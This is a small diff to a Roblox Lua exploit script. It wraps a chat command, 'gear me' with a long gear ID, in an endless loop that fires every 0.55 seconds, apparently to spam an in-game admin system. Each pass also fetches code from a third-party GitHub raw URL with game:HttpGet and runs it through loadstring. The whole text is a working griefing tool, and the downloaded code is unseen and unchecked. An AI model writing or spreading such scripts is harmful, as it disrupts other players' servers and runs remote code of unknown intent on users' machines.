@@ -1,8 +1,7 @@
-local spamgear = true
-local usetools = true
-if spamgear == true then
+while true do
 game.Players:Chat("gear me 00000000000000000000000000000000000000000292969139")
-end
-if usetools == true then
+wait(0.55)
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/usetools",true))()
+
 end
